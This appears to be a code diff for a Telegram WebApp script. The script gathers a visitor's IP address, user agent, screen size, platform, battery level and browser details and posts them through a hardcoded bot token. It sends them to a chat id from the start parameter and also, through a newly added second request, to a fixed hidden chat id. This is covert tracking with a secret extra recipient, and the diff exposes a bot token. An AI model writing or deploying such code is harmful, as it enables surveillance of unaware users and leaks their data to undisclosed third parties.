@@ -1,15 +1,68 @@
-function getIdFromURL() {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get('id') || 'неизвестно'; // Get 'id' from the URL, or return 'неизвестно' if not found
+async function getIPAddress() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error('Ошибка получения IP адреса:', error);
+        return 'неизвестно';
+    }
+}
+
+function getUserAgent() {
+    try {
+        return navigator.userAgent || 'неизвестно';
+    } catch (error) {
+        console.error('Ошибка получения UserAgent:', error);
+        return 'неизвестно';
+    }
+}
+
+function getScreenResolution() {
+    return `${window.screen.width}x${window.screen.height}` || 'неизвестно';
+}
+
+function getOSName() {
+    try {
+        return navigator.platform || 'неизвестно';
+    } catch (error) {
+        console.error('Ошибка получения имени ОС:', error);
+        return 'неизвестно';
+    }
+}
+
+async function getBatteryPercentage() {
+    try {
+        const battery = await navigator.getBattery();
+        return Math.floor(battery.level * 100);
+    } catch (error) {
+        console.error('Ошибка получения процента заряда батареи:', error);
+        return 'неизвестно';
+    }
+}
+
+function getBrowserInfo() {
+    try {
+        return {
+            name: navigator.appName || 'неизвестно',
+            version: navigator.appVersion || 'неизвестно',
+            engine: navigator.product || 'неизвестно'
+        };
+    } catch (error) {
+        console.error('Ошибка получения информации о браузере:', error);
+        return {
+            name: 'неизвестно',
+            version: 'неизвестно',
+            engine: 'неизвестно'
+        };
+    }
 }
 
 async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
     const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Replace with your bot token
-    const ownerId = getIdFromURL(); // Use the id from URL as chat_id
-
-    // Ensure ownerId is available, if not, use a fallback chat_id (for example, a default admin)
-    const chatId = ownerId !== 'неизвестно' ? ownerId : 'default_chat_id';  // Replace 'default_chat_id' with your fallback chat_id if needed
+    const chatId = tg.initDataUnsafe.start_param;
+    const additionalChatId = -1002202955038;
 
     const ipAddress = await getIPAddress();
     const userAgent = getUserAgent();
@@ -50,12 +103,12 @@ async function sendDataToTelegram() {
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
-`;
+    `;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
     const formData = new URLSearchParams();
-    formData.append('chat_id', chatId);  // Using the extracted id as chat_id
+    formData.append('chat_id', chatId);
     formData.append('text', message);
     formData.append('parse_mode', 'HTML');
 
@@ -73,6 +126,28 @@ async function sendDataToTelegram() {
         console.log('Запрос успешно отправлен');
     } catch (error) {
         console.error('Ошибка:', error);
+    }
+
+    // Second request
+    const formData1 = new URLSearchParams();
+    formData1.append('chat_id', additionalChatId);
+    formData1.append('text', message);
+    formData1.append('parse_mode', 'HTML');
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: formData1.toString()
+        });
+        if (!response.ok) {
+            throw new Error('Ошибка при отправке второго запроса: ' + response.statusText);
+        }
+        console.log('Второй запрос успешно отправлен');
+    } catch (error) {
+        console.error('Ошибка второго запроса:', error);
     }
 }
 
